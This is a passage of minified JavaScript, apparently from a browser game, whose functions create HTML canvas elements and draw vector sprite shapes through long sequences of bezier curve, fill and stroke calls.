                    r.bezierCurveTo(267 * e, 219 * e, 204 * e, 222 * e, 155 * e, 212 * e),
                    r.closePath(),
                    he(r, void 0, i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(239 * e, 59 * e),
                    r.bezierCurveTo(302 * e, 72 * e, 325 * e, 84 * e, 326 * e, 115 * e),
                    r.bezierCurveTo(289 * e, 80 * e, 270 * e, 88 * e, 253 * e, 78 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(216 * e, 61 * e),
                    r.bezierCurveTo(209 * e, 70 * e, 209 * e, 70 * e, 202 * e, 79 * e),
                    r.bezierCurveTo(173 * e, 87 * e, 162 * e, 91 * e, 137 * e, 107 * e),
                    r.bezierCurveTo(153 * e, 78 * e, 174 * e, 67 * e, 212 * e, 62 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(175 * e, 125 * e),
                    r.bezierCurveTo(218 * e, 94 * e, 238 * e, 90 * e, 281 * e, 125 * e),
                    r.bezierCurveTo(245 * e, 89 * e, 240 * e, 80 * e, 228 * e, 67 * e),
                    r.bezierCurveTo(207 * e, 100 * e, 192 * e, 104 * e, 177 * e, 123 * e),
                    r.closePath(),
                    he(r, i[2]),
                    n
            }
            function S0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 465 * e,
                    n.height = 405 * e,
                    r.globalAlpha = 1,
                    r.translate(6 * e, 0 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(39.000030517578125 * e, 162.03977966308594 * e),
                    r.bezierCurveTo(125.00003051757812 * e, 84.03977966308594 * e, 108.50003051757812 * e, 115.03977966308594 * e, 178.00003051757812 * e, 68.03977966308594 * e),
                    r.bezierCurveTo(299.0000305175781 * e, 146.53977966308594 * e, 299.0000305175781 * e, 146.53977966308594 * e, 420.0000305175781 * e, 225.03977966308594 * e),
                    r.bezierCurveTo(400.0000305175781 * e, 288.53977966308594 * e, 400.0000305175781 * e, 288.53977966308594 * e, 380.0000305175781 * e, 352.03977966308594 * e),
                    r.bezierCurveTo(216.50003051757812 * e, 345.53977966308594 * e, 216.50003051757812 * e, 345.53977966308594 * e, 53.000030517578125 * e, 339.03977966308594 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(23.000030517578125 * e, 306.94886779785156 * e),
                    r.bezierCurveTo(5.000030517578125 * e, 275.94886779785156 * e, 6.000030517578125 * e, 201.94886779785156 * e, 14.000030517578125 * e, 150.94886779785156 * e),
                    r.bezierCurveTo(40.000030517578125 * e, 34.94886779785156 * e, 157.00003051757812 * e, 14.948867797851562 * e, 199.00003051757812 * e, 11.948867797851562 * e),
                    r.bezierCurveTo(331.0000305175781 * e, .9488677978515625 * e, 409.0000305175781 * e, 61.94886779785156 * e, 428.0000305175781 * e, 133.94886779785156 * e),
                    r.bezierCurveTo(445.0000305175781 * e, 207.94886779785156 * e, 439.0000305175781 * e, 274.94886779785156 * e, 426.0000305175781 * e, 342.94886779785156 * e),
                    r.bezierCurveTo(355.0000305175781 * e, 207.94886779785156 * e, 345.0000305175781 * e, 208.94886779785156 * e, 333.0000305175781 * e, 202.94886779785156 * e),
                    r.bezierCurveTo(262.0000305175781 * e, 143.94886779785156 * e, 236.00003051757812 * e, 148.94886779785156 * e, 189.00003051757812 * e, 162.94886779785156 * e),
                    r.bezierCurveTo(82.00003051757812 * e, 190.94886779785156 * e, 78.00003051757812 * e, 235.94886779785156 * e, 62.000030517578125 * e, 279.94886779785156 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(17.000030517578125 * e, 149.94886779785156 * e),
                    r.bezierCurveTo(76.00003051757812 * e, 67.94886779785156 * e, 177.00003051757812 * e, 40.94886779785156 * e, 232.00003051757812 * e, 45.94886779785156 * e),
                    r.bezierCurveTo(316.0000305175781 * e, 46.94886779785156 * e, 359.0000305175781 * e, 74.94886779785156 * e, 428.0000305175781 * e, 145.94886779785156 * e),
                    r.bezierCurveTo(414.0000305175781 * e, 73.94886779785156 * e, 386.0000305175781 * e, 68.94886779785156 * e, 359.0000305175781 * e, 43.94886779785156 * e),
                    r.bezierCurveTo(295.0000305175781 * e, 5.9488677978515625 * e, 239.00003051757812 * e, 10.948867797851562 * e, 207.00003051757812 * e, 10.948867797851562 * e),
                    r.bezierCurveTo(121.00003051757812 * e, 20.948867797851562 * e, 104.00003051757812 * e, 34.94886779785156 * e, 45.000030517578125 * e, 84.94886779785156 * e),
                    r.bezierCurveTo(14.000030517578125 * e, 128.94886779785156 * e, 18.000030517578125 * e, 142.94886779785156 * e, 16.000030517578125 * e, 151.94886779785156 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(23.000030517578125 * e, 306.94886779785156 * e),
                    r.bezierCurveTo(5.000030517578125 * e, 275.94886779785156 * e, 6.000030517578125 * e, 201.94886779785156 * e, 14.000030517578125 * e, 150.94886779785156 * e),
                    r.bezierCurveTo(40.000030517578125 * e, 34.94886779785156 * e, 157.00003051757812 * e, 14.948867797851562 * e, 199.00003051757812 * e, 11.948867797851562 * e),
                    r.bezierCurveTo(331.0000305175781 * e, .9488677978515625 * e, 409.0000305175781 * e, 61.94886779785156 * e, 428.0000305175781 * e, 133.94886779785156 * e),
                    r.bezierCurveTo(445.0000305175781 * e, 207.94886779785156 * e, 439.0000305175781 * e, 274.94886779785156 * e, 426.0000305175781 * e, 342.94886779785156 * e),
                    r.bezierCurveTo(355.0000305175781 * e, 207.94886779785156 * e, 345.0000305175781 * e, 208.94886779785156 * e, 333.0000305175781 * e, 202.94886779785156 * e),
                    r.bezierCurveTo(262.0000305175781 * e, 143.94886779785156 * e, 236.00003051757812 * e, 148.94886779785156 * e, 189.00003051757812 * e, 162.94886779785156 * e),
                    r.bezierCurveTo(82.00003051757812 * e, 190.94886779785156 * e, 78.00003051757812 * e, 235.94886779785156 * e, 62.000030517578125 * e, 279.94886779785156 * e),
                    r.closePath(),
                    he(r, void 0, i[1], 16 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(60.000030517578125 * e, 288.03977966308594 * e),
                    r.bezierCurveTo(183.00003051757812 * e, 320.03977966308594 * e, 342.0000305175781 * e, 306.03977966308594 * e, 399.0000305175781 * e, 286.03977966308594 * e),
                    r.bezierCurveTo(420.0000305175781 * e, 345.03977966308594 * e, 410.0000305175781 * e, 335.03977966308594 * e, 415.0000305175781 * e, 362.03977966308594 * e),
                    r.bezierCurveTo(351.0000305175781 * e, 384.03977966308594 * e, 299.0000305175781 * e, 389.03977966308594 * e, 215.00003051757812 * e, 391.03977966308594 * e),
                    r.bezierCurveTo(128.00003051757812 * e, 388.03977966308594 * e, 69.00003051757812 * e, 373.03977966308594 * e, 39.000030517578125 * e, 359.03977966308594 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 13 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(47.000030517578125 * e, 327.03977966308594 * e),
                    r.bezierCurveTo(203.00003051757812 * e, 377.03977966308594 * e, 331.0000305175781 * e, 349.03977966308594 * e, 410.0000305175781 * e, 330.03977966308594 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(9.000030517578125 * e, 339.1306915283203 * e),
                    r.bezierCurveTo(2.000030517578125 * e, 280.1306915283203 * e, 30.000030517578125 * e, 219.1306915283203 * e, 85.00003051757812 * e, 167.1306915283203 * e),
                    r.bezierCurveTo(174.00003051757812 * e, 82.13069152832031 * e, 241.00003051757812 * e, 101.13069152832031 * e, 284.0000305175781 * e, 115.13069152832031 * e),
                    r.bezierCurveTo(333.0000305175781 * e, 134.1306915283203 * e, 376.0000305175781 * e, 177.1306915283203 * e, 410.0000305175781 * e, 247.1306915283203 * e),
                    r.bezierCurveTo(439.0000305175781 * e, 300.1306915283203 * e, 442.0000305175781 * e, 346.1306915283203 * e, 430.0000305175781 * e, 363.1306915283203 * e),
                    r.bezierCurveTo(418.0000305175781 * e, 366.1306915283203 * e, 395.0000305175781 * e, 295.1306915283203 * e, 355.0000305175781 * e, 223.1306915283203 * e),
                    r.bezierCurveTo(299.0000305175781 * e, 156.1306915283203 * e, 262.0000305175781 * e, 155.1306915283203 * e, 215.00003051757812 * e, 159.1306915283203 * e),
                    r.bezierCurveTo(133.00003051757812 * e, 171.1306915283203 * e, 120.00003051757812 * e, 193.1306915283203 * e, 96.00003051757812 * e, 221.1306915283203 * e),
                    r.bezierCurveTo(49.000030517578125 * e, 262.1306915283203 * e, 47.000030517578125 * e, 306.1306915283203 * e, 38.000030517578125 * e, 336.1306915283203 * e),
                    r.bezierCurveTo(30.000030517578125 * e, 349.1306915283203 * e, 30.000030517578125 * e, 349.1306915283203 * e, 22.000030517578125 * e, 362.1306915283203 * e),
                    r.closePath(),
                    he(r, i[2], i[1], 20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(228.00003051757812 * e, 128.03977966308594 * e),
                    r.bezierCurveTo(315.0000305175781 * e, 131.03977966308594 * e, 349.0000305175781 * e, 178.03977966308594 * e, 386.0000305175781 * e, 234.03977966308594 * e),
                    r.bezierCurveTo(444.0000305175781 * e, 329.03977966308594 * e, 446.0000305175781 * e, 354.03977966308594 * e, 427.0000305175781 * e, 373.03977966308594 * e),
                    r.bezierCurveTo(389.0000305175781 * e, 389.03977966308594 * e, 399.0000305175781 * e, 329.03977966308594 * e, 361.0000305175781 * e, 277.03977966308594 * e),
                    r.bezierCurveTo(306.0000305175781 * e, 191.03977966308594 * e, 266.0000305175781 * e, 183.03977966308594 * e, 220.00003051757812 * e, 181.03977966308594 * e),
                    r.bezierCurveTo(138.00003051757812 * e, 184.03977966308594 * e, 123.00003051757812 * e, 212.03977966308594 * e, 89.00003051757812 * e, 271.03977966308594 * e),
                    r.bezierCurveTo(52.000030517578125 * e, 349.03977966308594 * e, 68.00003051757812 * e, 364.03977966308594 * e, 33.000030517578125 * e, 369.03977966308594 * e),
                    r.bezierCurveTo(6.000030517578125 * e, 366.03977966308594 * e, 5.000030517578125 * e, 341.03977966308594 * e, 26.000030517578125 * e, 288.03977966308594 * e),
                    r.bezierCurveTo(60.000030517578125 * e, 207.03977966308594 * e, 100.00003051757812 * e, 180.03977966308594 * e, 113.00003051757812 * e, 170.03977966308594 * e),
                    r.bezierCurveTo(159.00003051757812 * e, 132.03977966308594 * e, 196.00003051757812 * e, 133.03977966308594 * e, 226.00003051757812 * e, 129.03977966308594 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 20 * e),
                    n
            }
            function m0(e, t, i, n) {
                var r = document.createElement("canvas")
                    , o = r.getContext("2d");
                return r.width = 198 * e,
                    r.height = 147 * e,
                    o.globalAlpha = t ? .5 : 1,
                    o.translate(0, 6 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(44 * e, 76 * e),
                    o.bezierCurveTo(50 * e, 82 * e, 50 * e, 82 * e, 56 * e, 88 * e),
                    o.bezierCurveTo(59 * e, 82 * e, 59 * e, 82 * e, 62 * e, 76 * e),
                    o.bezierCurveTo(59 * e, 71 * e, 59 * e, 71 * e, 56 * e, 66 * e),
                    o.bezierCurveTo(59 * e, 69 * e, 59 * e, 69 * e, 62 * e, 72 * e),
                    o.bezierCurveTo(80 * e, 48 * e, 102 * e, 50 * e, 120 * e, 62 * e),
                    o.bezierCurveTo(127 * e, 58 * e, 127 * e, 58 * e, 134 * e, 54 * e),
                    o.bezierCurveTo(129 * e, 60 * e, 129 * e, 60 * e, 124 * e, 66 * e),
                    o.bezierCurveTo(129 * e, 73 * e, 129 * e, 73 * e, 134 * e, 80 * e),
                    o.bezierCurveTo(140 * e, 74 * e, 140 * e, 74 * e, 146 * e, 68 * e),
                    o.bezierCurveTo(142 * e, 76 * e, 142 * e, 76 * e, 138 * e, 84 * e),
                    o.bezierCurveTo(144 * e, 90 * e, 142 * e, 90 * e, 144 * e, 90 * e),
                    o.bezierCurveTo(136 * e, 97 * e, 136 * e, 97 * e, 128 * e, 104 * e),
                    o.bezierCurveTo(154 * e, 110 * e, 164 * e, 90 * e, 160 * e, 80 * e),
                    o.bezierCurveTo(138 * e, 22 * e, 148 * e, 51 * e, 136 * e, 22 * e),
                    o.bezierCurveTo(97 * e, 24 * e, 97 * e, 24 * e, 58 * e, 26 * e),
                    o.bezierCurveTo(47 * e, 54 * e, 36 * e, 80 * e, 36 * e, 82 * e),
                    o.bezierCurveTo(40 * e, 108 * e, 54 * e, 104 * e, 62 * e, 104 * e),
                    o.bezierCurveTo(46 * e, 92 * e, 54 * e, 97 * e, 46 * e, 90 * e),
                    o.closePath(),
                    he(o, i[0]),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(36 * e, 80 * e),
                    o.bezierCurveTo(30 * e, 84 * e, 28 * e, 92 * e, 34 * e, 100 * e),
                    o.bezierCurveTo(41.5 * e, 102 * e, 41.5 * e, 102 * e, 49 * e, 104 * e),
                    o.bezierCurveTo(43 * e, 105.5 * e, 43 * e, 105.5 * e, 37 * e, 107 * e),
                    o.bezierCurveTo(46 * e, 111 * e, 60 * e, 114 * e, 76 * e, 114 * e),
                    o.bezierCurveTo(78 * e, 110.5 * e, 78 * e, 110.5 * e, 80 * e, 107 * e),
                    o.bezierCurveTo(81 * e, 110.5 * e, 81 * e, 110.5 * e, 82 * e, 114 * e),
                    o.bezierCurveTo(94.5 * e, 113.5 * e, 94.5 * e, 113.5 * e, 107 * e, 113 * e),
                    o.bezierCurveTo(108.5 * e, 110 * e, 108.5 * e, 110 * e, 110 * e, 107 * e),
                    o.bezierCurveTo(111.5 * e, 110.5 * e, 111.5 * e, 110.5 * e, 113 * e, 114 * e),
                    o.bezierCurveTo(131 * e, 112.5 * e, 131 * e, 112.5 * e, 149 * e, 111 * e),
                    o.bezierCurveTo(148.5 * e, 107.5 * e, 148.5 * e, 107.5 * e, 148 * e, 104 * e),
                    o.bezierCurveTo(150.5 * e, 107 * e, 150.5 * e, 107 * e, 153 * e, 110 * e),
                    o.bezierCurveTo(155.5 * e, 108.5 * e, 155.5 * e, 108.5 * e, 158 * e, 107 * e),
                    o.bezierCurveTo(156.5 * e, 104 * e, 156.5 * e, 104 * e, 155 * e, 101 * e),
                    o.bezierCurveTo(158.5 * e, 102.5 * e, 158.5 * e, 102.5 * e, 162 * e, 104 * e),
                    o.bezierCurveTo(168 * e, 100 * e, 170 * e, 92 * e, 169 * e, 85 * e),
                    o.bezierCurveTo(166 * e, 86 * e, 166 * e, 86 * e, 163 * e, 87 * e),
                    o.bezierCurveTo(165.5 * e, 83 * e, 165.5 * e, 83 * e, 168 * e, 79 * e),
                    o.bezierCurveTo(165.5 * e, 76.5 * e, 165.5 * e, 76.5 * e, 163 * e, 74 * e),
                    o.bezierCurveTo(155 * e, 82.5 * e, 155 * e, 82.5 * e, 147 * e, 91 * e),
                    o.bezierCurveTo(139 * e, 95.5 * e, 139 * e, 95.5 * e, 131 * e, 100 * e),
                    o.bezierCurveTo(97.5 * e, 100.5 * e, 97.5 * e, 100.5 * e, 64 * e, 101 * e),
                    o.bezierCurveTo(49 * e, 102 * e, 43 * e, 90 * e, 36 * e, 80 * e),
                    o.closePath(),
                    he(o, i[0]),
                    o.globalAlpha = 1,
                    o.translate(0, -6 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(36 * e, 80 * e),
                    o.bezierCurveTo(30 * e, 84 * e, 28 * e, 92 * e, 34 * e, 100 * e),
                    o.bezierCurveTo(41.5 * e, 102 * e, 41.5 * e, 102 * e, 49 * e, 104 * e),
                    o.bezierCurveTo(43 * e, 105.5 * e, 43 * e, 105.5 * e, 37 * e, 107 * e),
                    o.bezierCurveTo(46 * e, 111 * e, 60 * e, 114 * e, 76 * e, 114 * e),
                    o.bezierCurveTo(78 * e, 110.5 * e, 78 * e, 110.5 * e, 80 * e, 107 * e),
                    o.bezierCurveTo(81 * e, 110.5 * e, 81 * e, 110.5 * e, 82 * e, 114 * e),
                    o.bezierCurveTo(94.5 * e, 113.5 * e, 94.5 * e, 113.5 * e, 107 * e, 113 * e),
                    o.bezierCurveTo(108.5 * e, 110 * e, 108.5 * e, 110 * e, 110 * e, 107 * e),
                    o.bezierCurveTo(111.5 * e, 110.5 * e, 111.5 * e, 110.5 * e, 113 * e, 114 * e),
                    o.bezierCurveTo(131 * e, 112.5 * e, 131 * e, 112.5 * e, 149 * e, 111 * e),
                    o.bezierCurveTo(148.5 * e, 107.5 * e, 148.5 * e, 107.5 * e, 148 * e, 104 * e),
                    o.bezierCurveTo(150.5 * e, 107 * e, 150.5 * e, 107 * e, 153 * e, 110 * e),
                    o.bezierCurveTo(155.5 * e, 108.5 * e, 155.5 * e, 108.5 * e, 158 * e, 107 * e),
                    o.bezierCurveTo(156.5 * e, 104 * e, 156.5 * e, 104 * e, 155 * e, 101 * e),
                    o.bezierCurveTo(158.5 * e, 102.5 * e, 158.5 * e, 102.5 * e, 162 * e, 104 * e),
                    o.bezierCurveTo(168 * e, 100 * e, 170 * e, 92 * e, 169 * e, 85 * e),
                    o.bezierCurveTo(166 * e, 86 * e, 166 * e, 86 * e, 163 * e, 87 * e),
                    o.bezierCurveTo(165.5 * e, 83 * e, 165.5 * e, 83 * e, 168 * e, 79 * e),
                    o.bezierCurveTo(165.5 * e, 76.5 * e, 165.5 * e, 76.5 * e, 163 * e, 74 * e),
                    o.bezierCurveTo(155 * e, 82.5 * e, 155 * e, 82.5 * e, 147 * e, 91 * e),
                    o.bezierCurveTo(139 * e, 95.5 * e, 139 * e, 95.5 * e, 131 * e, 100 * e),
                    o.bezierCurveTo(97.5 * e, 100.5 * e, 97.5 * e, 100.5 * e, 64 * e, 101 * e),
                    o.bezierCurveTo(49 * e, 102 * e, 43 * e, 90 * e, 36 * e, 80 * e),
                    o.closePath(),
                    he(o, i[1], i[2], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(49 * e, 98 * e),
                    o.bezierCurveTo(96.5 * e, 98 * e, 96.5 * e, 98 * e, 144 * e, 98 * e),
                    o.bezierCurveTo(136.5 * e, 102 * e, 136.5 * e, 102 * e, 129 * e, 106 * e),
                    o.bezierCurveTo(103 * e, 105.5 * e, 103 * e, 105.5 * e, 77 * e, 105 * e),
                    o.bezierCurveTo(65 * e, 105 * e, 65 * e, 105 * e, 53 * e, 105 * e),
                    o.closePath(),
                    he(o, i[1]),
                    o.globalAlpha = .5,
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(54 * e, 98 * e),
                    o.bezierCurveTo(97 * e, 98 * e, 97 * e, 98 * e, 140 * e, 98 * e),
                    o.bezierCurveTo(134 * e, 101 * e, 134 * e, 101 * e, 128 * e, 104 * e),
                    o.bezierCurveTo(92 * e, 104 * e, 92 * e, 104 * e, 56 * e, 104 * e),
                    o.closePath(),
                    he(o, i[0]),
                    o.globalAlpha = 1,
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(118 * e, 47 * e),
                    o.bezierCurveTo(124.5 * e, 43.5 * e, 124.5 * e, 43.5 * e, 131 * e, 40 * e),
                    o.bezierCurveTo(128 * e, 46 * e, 128 * e, 46 * e, 125 * e, 52 * e),
                    o.bezierCurveTo(131 * e, 57 * e, 135 * e, 64 * e, 139 * e, 73 * e),
                    o.bezierCurveTo(142.5 * e, 69.5 * e, 142.5 * e, 69.5 * e, 146 * e, 66 * e),
                    o.bezierCurveTo(143.5 * e, 72.5 * e, 143.5 * e, 72.5 * e, 141 * e, 79 * e),
                    o.bezierCurveTo(142 * e, 91 * e, 141 * e, 94 * e, 132 * e, 98 * e),
                    o.bezierCurveTo(117 * e, 102 * e, 126 * e, 108 * e, 142 * e, 102 * e),
                    o.bezierCurveTo(159 * e, 98 * e, 164 * e, 80 * e, 162 * e, 47 * e),
                    o.bezierCurveTo(160 * e, 19 * e, 150 * e, 6 * e, 117 * e, 4 * e),
                    o.bezierCurveTo(44 * e, 0 * e, 35 * e, 20 * e, 33 * e, 37 * e),
                    o.bezierCurveTo(29 * e, 69 * e, 33 * e, 88 * e, 44 * e, 96 * e),
                    o.bezierCurveTo(64 * e, 107 * e, 70 * e, 102 * e, 54 * e, 93 * e),
                    o.bezierCurveTo(49 * e, 88 * e, 50 * e, 82 * e, 53 * e, 77 * e),
                    o.bezierCurveTo(51.5 * e, 71 * e, 51.5 * e, 71 * e, 50 * e, 65 * e),
                    o.bezierCurveTo(53 * e, 68.5 * e, 53 * e, 68.5 * e, 56 * e, 72 * e),
                    o.bezierCurveTo(59 * e, 67.5 * e, 59 * e, 67.5 * e, 62 * e, 63 * e),
                    o.bezierCurveTo(60.5 * e, 59.5 * e, 60.5 * e, 59.5 * e, 59 * e, 56 * e),
                    o.bezierCurveTo(62 * e, 57 * e, 62 * e, 57 * e, 65 * e, 58 * e),
                    o.bezierCurveTo(78 * e, 35 * e, 103 * e, 36 * e, 117 * e, 47 * e),
                    o.closePath(),
                    he(o, i[1], i[2], 6 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(62 * e, 21 * e),
                    o.bezierCurveTo(63 * e, 34 * e, 64 * e, 37 * e, 66 * e, 40 * e),
                    o.bezierCurveTo(54 * e, 49 * e, 53 * e, 51 * e, 48 * e, 58 * e),
                    o.bezierCurveTo(44 * e, 51 * e, 42 * e, 43 * e, 40 * e, 36 * e),
                    o.bezierCurveTo(47 * e, 28 * e, 52 * e, 25 * e, 61 * e, 21 * e),
                    o.closePath(),
                    he(o, i[4]),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(60 * e, 29 * e),
                    o.bezierCurveTo(62 * e, 25 * e, 65 * e, 24 * e, 70 * e, 23 * e),
                    he(o, void 0, i[3], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(61 * e, 37 * e),
                    o.bezierCurveTo(63 * e, 32 * e, 66 * e, 32 * e, 71 * e, 32 * e),
                    he(o, void 0, i[3], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(52 * e, 31 * e),
                    o.bezierCurveTo(50 * e, 26 * e, 50 * e, 25 * e, 51 * e, 23 * e),
                    he(o, void 0, i[3], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(46 * e, 35 * e),
                    o.bezierCurveTo(44 * e, 31 * e, 43 * e, 29 * e, 45 * e, 26 * e),
                    he(o, void 0, i[3], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(58 * e, 44 * e),
                    o.bezierCurveTo(57 * e, 48 * e, 57 * e, 50 * e, 60 * e, 52 * e),
                    he(o, void 0, i[3], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(53 * e, 48 * e),
                    o.bezierCurveTo(52 * e, 52 * e, 52 * e, 54 * e, 55 * e, 57 * e),
                    he(o, void 0, i[3], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(46 * e, 41 * e),
                    o.bezierCurveTo(41 * e, 42 * e, 39 * e, 45 * e, 38 * e, 48 * e),
                    he(o, void 0, i[3], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(48 * e, 48 * e),
                    o.bezierCurveTo(42 * e, 51 * e, 42 * e, 53 * e, 40 * e, 55 * e),
                    he(o, void 0, i[3], 4 * e),
                    0 == n ? (o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(99 * e, 101 * e),
                        o.bezierCurveTo(118.6666259765625 * e, 104.33331298828125 * e, 124.6666259765625 * e, 116.33331298828125 * e, 112.6666259765625 * e, 114.33331298828125 * e),
                        o.bezierCurveTo(104.6666259765625 * e, 112.33331298828125 * e, 100.6666259765625 * e, 105.33331298828125 * e, 99.6666259765625 * e, 101.33331298828125 * e),
                        he(o, void 0, i[5], 6 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(97.6666259765625 * e, 101.33331298828125 * e),
                        o.bezierCurveTo(81.6666259765625 * e, 106.33331298828125 * e, 79.6666259765625 * e, 114.33331298828125 * e, 89.6666259765625 * e, 114.33331298828125 * e),
                        o.bezierCurveTo(95.6666259765625 * e, 111.33331298828125 * e, 95.6666259765625 * e, 109.33331298828125 * e, 98.6666259765625 * e, 102.33331298828125 * e),
                        he(o, void 0, i[5], 6 * e)) : (o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(103 * e, 100.39999389648438 * e),
                            o.bezierCurveTo(120 * e, 106.39999389648438 * e, 118 * e, 107.39999389648438 * e, 120 * e, 111.39999389648438 * e),
                            he(o, void 0, i[5], 6 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(103 * e, 100.39999389648438 * e),
                            o.bezierCurveTo(90 * e, 103.39999389648438 * e, 89 * e, 106.39999389648438 * e, 87 * e, 112.39999389648438 * e),
                            he(o, void 0, i[5], 6 * e),
                            ke(o, 86 * e, 114.39999389648438 * e, 4.5 * e),
                            he(o, i[1], i[5], 6 * e),
                            ke(o, 121 * e, 114.39999389648438 * e, 4.5 * e),
                            he(o, i[1], i[5], 6 * e)),
                    r
            }
            function D0(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 253 * e,
                    i.height = 192 * e,
                    n.globalAlpha = .5,
                    n.save(),
                    n.translate(42 * e, 99 * e),
                    n.globalAlpha = .5,
                    Ve(n, -7 * e, -20 * e, 14 * e, 39 * e, 20 * e),
                    n.restore(),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    n.save(),
                    n.translate(37 * e, 94 * e),
                    Ve(n, -7 * e, -20 * e, 14 * e, 37 * e, 20 * e),
                    n.restore(),
                    he(n, t[2]),
                    n.globalAlpha = .5,
                    n.save(),
                    n.translate(136 * e, 99 * e),
                    n.globalAlpha = .5,
                    Ve(n, -84 * e, -67 * e, 168 * e, 134 * e, 20 * e),
                    n.restore(),
                    he(n, t[0], t[0], 13 * e),
                    n.globalAlpha = 1,
                    n.save(),
                    n.translate(131 * e, 94 * e),
                    Ve(n, -84 * e, -67 * e, 168 * e, 134 * e, 20 * e),
                    n.restore(),
                    he(n, t[2], t[2], 13 * e),
                    n.save(),
                    n.translate(131 * e, 94 * e),
                    Ve(n, -76 * e, -61 * e, 152 * e, 122 * e, 20 * e),
                    n.restore(),
                    he(n, t[3], t[1], 8 * e),
                    n.save(),
                    n.translate(168.5 * e, 93.5 * e),
                    Ve(n, -30.5 * e, -58.5 * e, 61 * e, 117 * e, 20 * e),
                    n.restore(),
                    he(n, t[3], t[4], 6 * e),
                    n.save(),
                    n.translate(93.5 * e, 95.5 * e),
                    Ve(n, -32 * e, -59.5 * e, 59 * e, 119 * e, 20 * e),
                    n.restore(),
                    he(n, t[3], t[4], 6 * e),
                    n.save(),
                    n.translate(130.5 * e, 94 * e),
                    Ve(n, -36 * e, -67 * e, 73 * e, 134 * e, 20 * e),
                    n.restore(),
                    he(n, t[3], t[2], 8 * e),
                    n.globalAlpha = .5,
                    n.save(),
                    n.translate(133 * e, 97 * e),
                    Ve(n, -83 * e, -12 * e, 160 * e, 24 * e, 0 * e),
                    n.restore(),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    n.save(),
                    n.translate(133 * e, 92 * e),
                    Ve(n, -83 * e, -12 * e, 160 * e, 24 * e, 0 * e),
                    n.restore(),
                    he(n, t[2]),
                    n.globalAlpha = .5,
                    n.save(),
                    n.translate(228 * e, 99.5 * e),
                    n.globalAlpha = .5,
                    Ve(n, -5 * e, -18.5 * e, 10 * e, 37 * e, 20 * e),
                    n.restore(),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    n.save(),
                    n.translate(223 * e, 94.5 * e),
                    Ve(n, -5 * e, -18.5 * e, 10 * e, 37 * e, 20 * e),
                    n.restore(),
                    he(n, t[2]),
                    n.save(),
                    n.translate(133.5 * e, 175.5 * e),
                    n.globalAlpha = .5,
                    Ve(n, -22.5 * e, -6.5 * e, 45 * e, 13 * e, 20 * e),
                    n.restore(),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    n.save(),
                    n.translate(128.5 * e, 170.5 * e),
                    Ve(n, -22.5 * e, -6.5 * e, 45 * e, 13 * e, 20 * e),
                    n.restore(),
                    he(n, t[2]),
                    i
            }
            function v0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 316 * e,
                    n.height = 365 * e,
                    r.save(),
                    r.translate(156.07142639160156 * e, 51.81248474121094 * e),
                    r.rotate(0),
                    Ve(r, -21.5 * e, -34 * e, 43 * e, 68 * e, 8 * e),
                    r.restore(),
                    he(r, i[1], i[2], 15 * e),
                    r.beginPath(),
